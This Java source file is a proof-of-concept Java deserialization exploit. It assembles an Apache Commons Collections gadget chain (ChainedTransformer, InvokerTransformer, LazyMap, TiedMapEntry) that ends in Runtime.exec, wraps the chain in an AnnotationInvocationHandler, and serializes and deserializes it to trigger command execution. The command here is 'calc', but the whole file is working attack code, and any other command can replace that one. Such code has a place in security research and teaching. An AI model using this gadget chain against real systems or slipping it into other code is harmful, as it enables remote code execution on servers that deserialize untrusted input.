package cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

public class HashMap_toString {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map decorate = LazyMap.decorate(new HashMap(), new ConstantFactory(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,1);
        HashMap<Object, Object> map = new HashMap();
        map.put("value",tiedMapEntry);

        Class<?> AnnotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> Anotationdeclared = AnnotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        Anotationdeclared.setAccessible(true);
        InvocationHandler h = (InvocationHandler) Anotationdeclared.newInstance(Target.class, map);

        SerializableTest.setFieldValue(decorate, "factory",transformerChain );
        SerializableTest.setFieldValue(tiedMapEntry, "key",233);
        SerializableTest.searilze(h,"HashMap_equals.bin");
        SerializableTest.unzearilze("HashMap_equals.bin");
    }
}
